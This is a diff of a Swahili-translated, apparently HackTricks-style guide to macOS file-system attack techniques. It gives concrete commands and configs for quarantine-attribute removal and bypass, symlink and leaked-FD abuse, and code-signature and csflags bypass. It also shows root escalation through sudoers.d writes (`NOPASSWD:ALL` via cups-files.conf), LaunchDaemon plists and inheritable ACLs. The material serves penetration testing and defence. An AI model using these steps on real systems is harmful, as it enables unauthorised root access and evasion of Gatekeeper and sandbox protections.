@@ -6,43 +6,50 @@
 
 Ruhusa katika **directory**:
 
-- **kusoma** - unaweza **kuhesabu** entries za directory
-- **kuandika** - unaweza **kufuta/kuandika** **files** katika directory na unaweza **kufuta folda tupu**.
-- Lakini huwezi **kufuta/kubadilisha folda zisizo tupu** isipokuwa una ruhusa za kuandika juu yake.
-- Huwezi **kubadilisha jina la folda** isipokuwa unamiliki hiyo.
-- **kutekeleza** - ume **ruhusiwa kupita** katika directory - ikiwa huna haki hii, huwezi kufikia files zozote ndani yake, au katika folda ndogo zozote.
+- **read** - unaweza **enumerate** entries za directory
+- **write** - unaweza **delete/write** **files** katika directory na unaweza **delete empty folders**.
+- Lakini **huwezi delete/modify non-empty folders** isipokuwa uwe na write permissions juu yake.
+- **Huwezi modify jina la folder** isipokuwa uwe mmiliki wake.
+- **execute** - **unaruhusiwa ku-traverse** directory - ikiwa huna ruhusa hii, huwezi kufikia files zozote zilizo ndani yake, au katika subdirectories zozote.
 
 ### Mchanganyiko Hatari
 
-**Jinsi ya kufuta faili/folda inayomilikiwa na root**, lakini:
+**Jinsi ya overwrite file/folder inayomilikiwa na root**, lakini:
 
-- Mmiliki mmoja wa **directory** katika njia ni mtumiaji
-- Mmiliki mmoja wa **directory** katika njia ni **kikundi cha watumiaji** chenye **ruhusa za kuandika**
-- Kikundi cha watumiaji kina **ruhusa za kuandika** kwa **faili**
+- **directory owner** mmoja wa parent katika path ni user
+- **directory owner** mmoja wa parent katika path ni **users group** yenye **write access**
+- **users group** ina **write** access kwa **file**
 
-Kwa mchanganyiko wowote wa hapo juu, mshambuliaji anaweza **kuingiza** **sym/hard link** kwenye njia inayotarajiwa ili kupata kuandika kwa kibali bila mipaka.
+Kwa mchanganyiko wowote uliotajwa hapo awali, attacker anaweza **inject** **sym/hard link** kwenye path inayotarajiwa ili kupata privileged arbitrary write.
 
-### Kesi Maalum ya Folda root R+X
+### Folder root R+X Special case
 
-Ikiwa kuna files katika **directory** ambapo **ni root pekee ana R+X access**, hizo **hazipatikani kwa mtu mwingine yeyote**. Hivyo, udhaifu unaoruhusu **kuhamasisha faili inayoweza kusomwa na mtumiaji**, ambayo haiwezi kusomwa kwa sababu ya **kizuizi** hicho, kutoka folda hii **kwenda folda nyingine**, inaweza kutumika kusoma files hizi.
+Ikiwa kuna files katika **directory** ambapo **root pekee ndiye mwenye R+X access**, files hizo **hazifikiki na mtu mwingine yeyote**. Kwa hiyo, vulnerability inayoruhusu **move file inayoweza kusomwa na user**, ambayo haiwezi kusomwa kwa sababu ya **restriction** hiyo, kutoka kwenye folder hii **hadi nyingine**, inaweza kutumiwa vibaya kusoma files hizi.
 
 Mfano katika: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
 
-## Link ya Alama / Link ya Ngumu
+## Symbolic Link / Hard Link
 
-### Faili/Folda za Ruhusa
+### Permissive file/folder
 
-Ikiwa mchakato wenye mamlaka unandika data katika **faili** ambayo inaweza **kudhibitiwa** na **mtumiaji mwenye mamlaka ya chini**, au ambayo inaweza **kuundwa awali** na mtumiaji mwenye mamlaka ya chini. Mtumiaji anaweza tu **kuielekeza kwenye faili nyingine** kupitia Link ya Alama au Link ya Ngumu, na mchakato wenye mamlaka utaandika kwenye faili hiyo.
+Ikiwa privileged process inaandika data katika **file** ambayo inaweza **controlled** na **lower privileged user**, au ambayo inaweza kuwa **previously created** na lower privileged user. User anaweza tu **point** hiyo kwenye file nyingine kupitia Symbolic au Hard link, na privileged process itaandika kwenye file hiyo.
 
-Angalia katika sehemu nyingine ambapo mshambuliaji anaweza **kudhulumu kuandika bila mipaka ili kupandisha mamlaka**.
+Angalia sections nyingine ambako attacker anaweza **abuse an arbitrary write to escalate privileges**.
 
-### Funguo `O_NOFOLLOW`
+### Open `O_NOFOLLOW`
 
-Funguo `O_NOFOLLOW` inapokuwa inatumika na kazi `open` haitafuata symlink katika kipengele cha mwisho cha njia, lakini itafuata sehemu nyingine za njia. Njia sahihi ya kuzuia kufuata symlinks katika njia ni kwa kutumia funguo `O_NOFOLLOW_ANY`.
+Kulingana na [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Ni **final** component pekee inayokaguliwa — kila **intermediate** component bado inatatuliwa na kufuatwa. Kwa hiyo, developer ambaye "amelinda" write kwa `O_NOFOLLOW` bado anaweza kushambuliwa kwa kuweka symlink kwenye **parent directory** yoyote ya target path.
+
+Man page hiyo hiyo inaandika flags ambazo hufunga pengo hilo:
+
+- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
+- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*
+
+Vinginevyo, `openat()` iliyo relative kwa directory FD ambayo tayari ume-validate, au `realpath()` + re-validation, ndizo njia zilizosalia za kuzuia mid-path symlink swaps.
 
 ## .fileloc
 
-Files zenye kiambatisho **`.fileloc`** zinaweza kuelekeza kwenye programu nyingine au binaries hivyo wakati zinapofunguliwa, programu/binary itakuwa ndiyo itakayotekelezwa.\
+Files zenye extension ya **`.fileloc`** zinaweza kuelekeza kwenye applications au binaries nyingine, kwa hiyo zinapofunguliwa, application/binary hiyo ndiyo itakayo-execute.\
 Mfano:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -60,21 +67,33 @@ Mfano:
 
 ### Leak FD (no `O_CLOEXEC`)
 
-Ikiwa wito wa `open` haina bendera `O_CLOEXEC`, desktopu ya faili itarithiwa na mchakato wa mtoto. Hivyo, ikiwa mchakato wenye mamlaka unafungua faili yenye mamlaka na kutekeleza mchakato unaodhibitiwa na mshambuliaji, mshambuliaji atakuwa **na FD juu ya faili yenye mamlaka**.
+Ikiwa call ya `open` haina flag ya `O_CLOEXEC`, file descriptor itarithiwa na child process. Kwa hivyo, ikiwa privileged process itafungua privileged file na kutekeleza process inayodhibitiwa na attacker, attacker **atarithi FD ya privileged file**.
 
-Ikiwa unaweza kufanya **mchakato ufungue faili au folda zenye mamlaka ya juu**, unaweza kutumia **`crontab`** kufungua faili katika `/etc/sudoers.d` na **`EDITOR=exploit.py`**, hivyo `exploit.py` itapata FD kwa faili ndani ya `/etc/sudoers` na kuifanya.
+Mfano maarufu ni **`DYLD_PRINT_TO_FILE` LPE katika OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):
 
-Kwa mfano: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), code: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging
+- `dyld` iliheshimu `DYLD_PRINT_TO_FILE=/path` hata katika **restricted (suid root) binaries**, kwa sababu variable hiyo maalum iliparsiwa nje ya `processDyldEnvironmentVariable()`.
+- Ilifanya `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, hivyo **iliunda file inayomilikiwa na root katika path yoyote**.
+- FD **haikuwahi kufungwa na haikuwa na close-on-exec flag**, kwa hivyo kila child wa suid binary alirithi **writable FD ya file inayomilikiwa na root**.
+- Kuendesha, kwa mfano, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` na kisha kusoma namba ya FD iliyorithiwa katika child kulitoa uwezo wa kufanya writes zozote kwenye files zinazomilikiwa na root; `fcntl(fd, F_SETFL, 0)` hata iliondoa `O_APPEND` ili kuruhusu overwriting badala ya appending.
 
-## Avoid quarantine xattrs tricks
+Muundo kama huo hujitokeza kila privileged process inapofungua file **kabla** ya kufanya `exec` ya kitu unachodhibiti (helper tools, editors za mtindo wa `crontab` zinazoitwa kupitia `$EDITOR`, log/debug files zinazofunguliwa kutoka kwenye env-var path...). Enumerate FDs ulizorithi kwa kutumia:
+```bash
+# From inside the child process
+ls -l /dev/fd/
+# or
+lsof -p $$
+```
+Kitu chochote kilicho juu ya `2` kinachoelekeza kwenye faili ambalo huwezi kulifungua mwenyewe ni primitive ya arbitrary-write (au arbitrary-read).
 
-### Remove it
+## Epuka tricks za quarantine xattrs
+
+### Iondoe
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
 ### uchg / uchange / uimmutable flag
 
-Ikiwa faili/folda ina sifa hii isiyobadilika haitakuwa na uwezo wa kuweka xattr juu yake
+Ikiwa file/folder ina attribute hii ya immutable, haitawezekana kuweka xattr juu yake
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -84,20 +103,22 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-### defvfs mount
+### File systems zisizo na usaidizi wa xattr
 
-A **devfs** mount **haina msaada wa xattr**, maelezo zaidi katika [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
+Si kila file system ambayo macOS inaweza ku-mount huhifadhi **extended attributes** natively. HFS+ na APFS zinaweza; **FAT32, exFAT na mounts nyingi za NFS hazina** — macOS huzi-emulate kwa kuandika side file ya **AppleDouble** yenye jina `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).
+
+Hilo ni muhimu kwa quarantine, kwa sababu xattr hudumu tu ikiwa inaweza kuandikwa **na kusomwa tena** kutoka kwenye volume hiyo hiyo:
 ```bash
-mkdir /tmp/mnt
-mount_devfs -o noowners none "/tmp/mnt"
-chmod 777 /tmp/mnt
-mkdir /tmp/mnt/lol
-xattr -w com.apple.quarantine "" /tmp/mnt/lol
-xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
+# Check whether a mount point round-trips xattrs at all
+xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
+xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
+ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
 ```
+Ikiwa volume itasomwa baadaye kupitia path inayopuuza companion ya `._` (au companion itaondolewa/kufutwa), file itafika **bila quarantine flag** — na `.app` isiyo na quarantine inatosha kuhepa App Sandbox, kama ilivyoelezwa katika [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).
+
 ### writeextattr ACL
 
-ACL hii inazuia kuongeza `xattrs` kwenye faili
+ACL hii huzuia kuongeza `xattrs` kwenye file
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -120,13 +141,13 @@ ls -le /tmp/test
 ```
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** muundo wa faili unakopi faili pamoja na ACE zake.
+**AppleDouble** file format hunakili faili pamoja na ACE zake.
 
-Katika [**kanuni ya chanzo**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandiko wa ACL ulihifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili lililoshughulikiwa. Hivyo, ikiwa umeweka programu katika faili la zip kwa muundo wa faili wa **AppleDouble** ukiwa na ACL inayozuia xattrs zingine kuandikwa ndani yake... xattr ya karantini haikuwekwa katika programu:
+Katika [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), inawezekana kuona kwamba uwakilishi wa maandishi wa ACL uliohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL kwenye faili iliyodecompressed. Kwa hiyo, ukicompress application kuwa zip file kwa kutumia **AppleDouble** file format yenye ACL inayozuia xattrs nyingine kuandikwa ndani yake... quarantine xattr haikuwekwa kwenye application:
 
-Angalia [**ripoti ya asili**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.
+Angalia [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.
 
-Ili kuiga hii tunahitaji kwanza kupata mfuatano sahihi wa acl:
+Ili kurudia hili, kwanza tunahitaji kupata acl string sahihi:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -144,23 +165,24 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-(Note that even if this works the sandbox write the quarantine xattr before)
+(Kumbuka kwamba hata kama hii itafanya kazi, sandbox huandika xattr ya quarantine kabla)
 
-Sio kweli inahitajika lakini naiacha hapa tu kwa sababu:
+Si muhimu sana, lakini nimeiacha hapo kwa tahadhari tu:
+
 
 {{#ref}}
 macos-xattr-acls-extra-stuff.md
 {{#endref}}
 
-## Pita ukaguzi wa saini
+## Bypass signature checks
 
-### Pita ukaguzi wa binaries za jukwaa
+### Bypass platform binaries checks
 
-Baadhi ya ukaguzi wa usalama huangalia kama binary ni **binary ya jukwaa**, kwa mfano kuruhusu kuungana na huduma ya XPC. Hata hivyo, kama ilivyoonyeshwa katika njia ya kupita katika https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, inawezekana kupita ukaguzi huu kwa kupata binary ya jukwaa (kama /bin/ls) na kuingiza exploit kupitia dyld kwa kutumia variable ya mazingira `DYLD_INSERT_LIBRARIES`.
+Baadhi ya ukaguzi wa usalama huangalia kama binary ni **platform binary**, kwa mfano ili kuruhusu kuunganisha kwenye huduma ya XPC. Hata hivyo, kama ilivyoonyeshwa katika bypass moja kwenye https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ inawezekana kufanya bypass ya ukaguzi huu kwa kupata platform binary (kama /bin/ls) na kuingiza exploit kupitia dyld kwa kutumia environment variable `DYLD_INSERT_LIBRARIES`.
 
-### Pita bendera `CS_REQUIRE_LV` na `CS_FORCED_LV`
+### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`
 
-Inawezekana kwa binary inayotekelezwa kubadilisha bendera zake mwenyewe ili kupita ukaguzi kwa kutumia msimbo kama:
+Inawezekana kwa binary inayotekelezwa kurekebisha flags zake yenyewe ili kupita ukaguzi kwa kutumia code kama hii:
 ```c
 // Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
 int pid = getpid();
@@ -175,9 +197,9 @@ NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, statu
 ```
 ## Bypass Code Signatures
 
-Bundles zina faili **`_CodeSignature/CodeResources`** ambayo ina **hash** ya kila **faili** katika **bundle**. Kumbuka kwamba hash ya CodeResources pia **imejumuishwa katika executable**, hivyo hatuwezi kuingilia hapo pia.
+Bundles zina faili **`_CodeSignature/CodeResources`** ambayo ina **hash** ya kila **faili** ndani ya **bundle**. Kumbuka kwamba hash ya CodeResources pia **imewekwa ndani ya executable**, kwa hivyo hatuwezi kuibadilisha hiyo pia.
 
-Hata hivyo, kuna baadhi ya faili ambazo saini zao hazitakaguliwa, hizi zina ufunguo omit katika plist, kama:
+Hata hivyo, kuna baadhi ya faili ambazo signature yake haitakaguliwa; hizi zina key `omit` kwenye plist, kama vile:
 ```xml
 <dict>
 ...
@@ -221,13 +243,13 @@ Hata hivyo, kuna baadhi ya faili ambazo saini zao hazitakaguliwa, hizi zina ufun
 ...
 </dict>
 ```
-Inawezekana kuhesabu saini ya rasilimali kutoka kwa cli kwa:
+Inawezekana kukokotoa signature ya resource kutoka kwa cli kwa kutumia:
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-## Mount dmgs
+## Ku-mount dmgs
 
-Mtumiaji anaweza kuunganisha dmg maalum iliyoundwa hata juu ya folda zilizopo. Hivi ndivyo unavyoweza kuunda kifurushi cha dmg maalum chenye maudhui maalum:
+Mtumiaji anaweza ku-mount dmg maalum iliyoundwa hata juu ya baadhi ya folders zilizopo. Hivi ndivyo unavyoweza kuunda package ya dmg maalum yenye content maalum:
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -248,20 +270,20 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # You can also create a dmg from an app using:
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
-Kawaida macOS inachomeka diski kwa kuzungumza na huduma ya Mach `com.apple.DiskArbitrarion.diskarbitrariond` (iliyotolewa na `/usr/libexec/diskarbitrationd`). Ikiwa unongeza paramu `-d` kwenye faili la LaunchDaemons plist na kuanzisha upya, itahifadhi kumbukumbu katika `/var/log/diskarbitrationd.log`.\
-Hata hivyo, inawezekana kutumia zana kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na kext `com.apple.driver.DiskImages`.
+Kwa kawaida macOS hu-mount diski huku ikiwasiliana na Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (inayotolewa na `/usr/libexec/diskarbitrationd`). Ukiongeza param `-d` kwenye faili ya LaunchDaemons plist na kui-restart, itaandika logs kwenye `/var/log/diskarbitrationd.log`.\
+Hata hivyo, inawezekana kutumia tools kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na kext ya `com.apple.driver.DiskImages`.
 
-## Maandishi ya Huru
+## Arbitrary Writes
 
-### Scripts za sh za Kila Wakati
+### Periodic sh scripts
 
-Ikiwa script yako inaweza kutafsiriwa kama **shell script** unaweza kuandika upya **`/etc/periodic/daily/999.local`** shell script ambayo itazinduliwa kila siku.
+Ikiwa script yako inaweza kutafsiriwa kama **shell script**, unaweza ku-overwrite **`/etc/periodic/daily/999.local`** shell script ambayo ita-triggeriwa kila siku.
 
-Unaweza **kuigiza** utekelezaji wa script hii kwa: **`sudo periodic daily`**
+Unaweza kuiga execution ya script hii kwa: **`sudo periodic daily`**
 
 ### Daemons
 
-Andika **LaunchDaemon** ya huru kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** yenye plist inayotekeleza script ya huru kama:
+Andika **LaunchDaemon** ya kiholela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** yenye plist inayotekeleza script ya kiholela kama:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -278,59 +300,66 @@ Andika **LaunchDaemon** ya huru kama **`/Library/LaunchDaemons/xyz.hacktricks.pr
 </dict>
 </plist>
 ```
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+Tengeneza tu script `/Applications/Scripts/privesc.sh` yenye **commands** ambazo ungependa kuendesha kama root.
 
 ### Sudoers File
 
-If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
+Ikiwa una **arbitrary write**, unaweza kutengeneza faili ndani ya folda **`/etc/sudoers.d/`** ili kujipa ruhusa za **sudo**.
 
 ### PATH files
 
-The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
+Faili **`/etc/paths`** ni mojawapo ya sehemu kuu zinazojaza variable ya mazingira ya PATH. Lazima uwe root ili kuibadilisha, lakini ikiwa script kutoka kwenye **privileged process** inaendesha **command bila full path**, unaweza kuweza kuifanya **hijack** kwa kurekebisha faili hii.
 
-You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
+Unaweza pia kuandika faili ndani ya **`/etc/paths.d`** ili kupakia folda mpya kwenye variable ya mazingira ya `PATH`.
 
 ### cups-files.conf
 
-Hii mbinu ilitumika katika [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).
+Technique hii ilitumika katika [writeup hii](https://www.kandji.io/blog/macos-audit-story-part1).
 
-Create the file `/etc/cups/cups-files.conf` with the following content:
+Tengeneza faili `/etc/cups/cups-files.conf` yenye content ifuatayo:
 ```
 ErrorLog /etc/sudoers.d/lpe
 LogFilePerm 777
 <some junk>
 ```
-Hii itaunda faili `/etc/sudoers.d/lpe` yenye ruhusa 777. Takataka za ziada mwishoni ni kuanzisha uundaji wa log ya makosa.
+Hii itaunda faili `/etc/sudoers.d/lpe` lenye permissions 777. Junk ya ziada mwishoni inalenga kusababisha uundwaji wa error log.
 
-Kisha, andika katika `/etc/sudoers.d/lpe` usanidi unaohitajika ili kupandisha mamlaka kama `%staff ALL=(ALL) NOPASSWD:ALL`.
+Kisha, andika kwenye `/etc/sudoers.d/lpe` config inayohitajika ili kufanya privilege escalation kama `%staff ALL=(ALL) NOPASSWD:ALL`.
 
-Kisha, badilisha faili `/etc/cups/cups-files.conf` tena ukionyesha `LogFilePerm 700` ili faili mpya ya sudoers iwe halali kwa kuanzisha `cupsctl`.
+Halafu, rekebisha faili `/etc/cups/cups-files.conf` tena kwa kuweka `LogFilePerm 700`, ili faili mpya ya sudoers iwe valid wakati wa kuendesha `cupsctl`.
 
 ### Sandbox Escape
 
-Inawezekana kutoroka sandbox ya macOS kwa kuandika FS isiyo na mipaka. Kwa mifano mingine angalia ukurasa [macOS Auto Start](../../../../macos-auto-start-locations.md) lakini moja ya kawaida ni kuandika faili ya mapendeleo ya Terminal katika `~/Library/Preferences/com.apple.Terminal.plist` inayotekeleza amri wakati wa kuanzisha na kuitwa kwa kutumia `open`.
+Inawezekana kutoroka kutoka kwenye macOS sandbox kwa kutumia FS arbitrary write. Kwa mifano kadhaa, angalia ukurasa wa [macOS Auto Start](../../../../macos-auto-start-locations.md), lakini njia ya kawaida ni kuandika preferences file ya Terminal kwenye `~/Library/Preferences/com.apple.Terminal.plist` ambayo huendesha command wakati wa startup, kisha kuiita kwa kutumia `open`.
 
 ## Generate writable files as other users
 
-Hii itazalisha faili inayomilikiwa na root ambayo inaweza kuandikwa na mimi ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Hii inaweza pia kufanya kazi kama privesc:
+Privesc primitive ya kawaida sana ni kufanya **privileged process iunde faili kwa niaba yako** kwenye directory unayodhibiti, kisha kubaki na **write access** kwenye faili hilo. Vipengele viwili vinahitajika:
+
+1. Directory unayomiliki (au ambayo unaweza kuweka **inheritable ACL**), ili kila kitu kinachoundwa ndani yake kirithi permissions zako.
+2. Process yenye privileges/`suid` ambayo inaweza kuambiwa **wapi** iunde faili — kwa kawaida kupitia environment variable ya debug/logging, config file, au XPC API ya helper.
+
+Sehemu ya **inheritable ACL** ndiyo inayofanya faili lililoundwa liwe writable kwako ingawa linamilikiwa na user mwingine. Flags za inheritance za `file_inherit` / `directory_inherit` zimeelezewa kwenye [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
 ```bash
-DIRNAME=/usr/local/etc/periodic/daily
-
+DIRNAME=/tmp/inherit_test
 mkdir -p "$DIRNAME"
-chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"
 
-MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername
+# file_inherit + directory_inherit => everything created inside is writable by me
+chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"
 
-FILENAME=$(ls "$DIRNAME")
-echo $FILENAME
+ls -lde "$DIRNAME"   # confirm the ACE is present
 ```
+Sasa faili yoyote ambayo mchakato wenye privileged unatengeneza ndani ya `$DIRNAME` **inaweza kuandikwa na wewe**. Ikiwa directory hiyo pia ni eneo ambalo baadaye **hutekelezwa kama root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, directory ya LaunchDaemon...), hii ni root escalation ya moja kwa moja. Tazama sehemu za [Sudoers File](#sudoers-file) na [cups-files.conf](#cups-filesconf) hapo juu ili kuona cha kuandika mara tu unapokuwa na faili hiyo.
+
+Kwa mfano kamili wa mnyororo wa `"env variable makes a root process create a file, and the FD leaks to you"`, tazama [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) hapo juu.
+
 ## POSIX Shared Memory
 
-**POSIX shared memory** inaruhusu michakato katika mifumo ya uendeshaji inayokubaliana na POSIX kufikia eneo la kawaida la kumbukumbu, ikirahisisha mawasiliano ya haraka ikilinganishwa na mbinu nyingine za mawasiliano kati ya michakato. Inahusisha kuunda au kufungua kitu cha kumbukumbu ya pamoja kwa kutumia `shm_open()`, kuweka ukubwa wake kwa `ftruncate()`, na kuunganisha katika nafasi ya anwani ya mchakato kwa kutumia `mmap()`. Michakato inaweza kisha kusoma moja kwa moja kutoka na kuandika kwenye eneo hili la kumbukumbu. Ili kudhibiti ufikiaji wa pamoja na kuzuia uharibifu wa data, mitambo ya usawazishaji kama vile mutexes au semaphores mara nyingi hutumiwa. Hatimaye, michakato huondoa na kufunga kumbukumbu ya pamoja kwa kutumia `munmap()` na `close()`, na kwa hiari kuondoa kitu cha kumbukumbu kwa kutumia `shm_unlink()`. Mfumo huu ni wa ufanisi hasa kwa IPC yenye ufanisi na haraka katika mazingira ambapo michakato mingi inahitaji kufikia data ya pamoja kwa haraka.
+**POSIX shared memory** huruhusu processes katika operating systems zinazotii POSIX kufikia eneo la memory la pamoja, hivyo kuwezesha mawasiliano ya haraka zaidi ikilinganishwa na mbinu nyingine za inter-process communication. Hii inahusisha kuunda au kufungua shared memory object kwa kutumia `shm_open()`, kuweka ukubwa wake kwa `ftruncate()`, na kuimap katika address space ya process kwa kutumia `mmap()`. Processes zinaweza kisha kusoma moja kwa moja kutoka na kuandika kwenye eneo hili la memory. Ili kudhibiti access ya wakati mmoja na kuzuia data corruption, synchronization mechanisms kama mutexes au semaphores hutumiwa mara nyingi. Mwishowe, processes hu-unmap na kufunga shared memory kwa `munmap()` na `close()`, na kwa hiari huondoa memory object kwa `shm_unlink()`. Mfumo huu ni mzuri hasa kwa IPC yenye ufanisi na kasi katika mazingira ambayo processes nyingi zinahitaji kufikia shared data kwa haraka.
 
 <details>
 
-<summary>Producer Code Example</summary>
+<summary>Mfano wa Code ya Producer</summary>
 ```c
 // gcc producer.c -o producer -lrt
 #include <fcntl.h>
@@ -378,7 +407,7 @@ return 0;
 
 <details>
 
-<summary>Mfano wa Kanuni ya Mtumiaji</summary>
+<summary>Mfano wa Consumer Code</summary>
 ```c
 // gcc consumer.c -o consumer -lrt
 #include <fcntl.h>
@@ -422,16 +451,21 @@ return 0;
 
 ## macOS Guarded Descriptors
 
-**macOSCguarded descriptors** ni kipengele cha usalama kilichozinduliwa katika macOS ili kuboresha usalama na uaminifu wa **file descriptor operations** katika programu za mtumiaji. Hizi guarded descriptors zinatoa njia ya kuunganisha vizuizi maalum au "guards" na file descriptors, ambavyo vinatekelezwa na kernel.
+**macOS Guarded Descriptors** ni kipengele cha usalama kilichoanzishwa katika macOS ili kuimarisha usalama na utegemezi wa **file descriptor operations** katika applications za watumiaji. Guarded descriptors hizi hutoa njia ya kuhusisha vizuizi maalum au "guards" na file descriptors, ambavyo hutekelezwa na kernel.
 
-Kipengele hiki ni muhimu hasa katika kuzuia aina fulani za udhaifu wa usalama kama vile **unauthorized file access** au **race conditions**. Udhaifu huu hutokea wakati kwa mfano thread inapata file description ikitoa **thread nyingine yenye udhaifu ufikiaji juu yake** au wakati file descriptor inachukuliwa na mchakato wa mtoto mwenye udhaifu. Baadhi ya kazi zinazohusiana na kazi hii ni:
+Kipengele hiki ni muhimu hasa katika kuzuia aina fulani za vulnerabilities za usalama kama vile **ufikiaji usioidhinishwa wa files** au **race conditions**. Vulnerabilities hizi hutokea, kwa mfano, thread inapofikia file description na kumpa **thread nyingine iliyo katika hatari ufikiaji wa file hiyo**, au file descriptor **inaporithiwa** na child process iliyo katika hatari. Baadhi ya functions zinazohusiana na utendaji huu ni:
 
-- `guarded_open_np`: Fungua FD na guard
-- `guarded_close_np`: Funga
-- `change_fdguard_np`: Badilisha bendera za guard kwenye descriptor (hata kuondoa ulinzi wa guard)
+- `guarded_open_np`: Fungua FD yenye guard
+- `guarded_close_np`: Ifunge
+- `change_fdguard_np`: Badilisha flags za guard kwenye descriptor (hata kuondoa ulinzi wa guard)
 
 ## References
 
 - [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
+- [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (FD iliyovuja bila close-on-exec)
+- [The Eclectic Light Company - Ni file systems na cloud services zipi huhifadhi extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
+- [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
+- [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (flags za ACL inheritance)
+- [Microsoft - Gatekeeper's Achilles heel: kugundua vulnerability ya macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
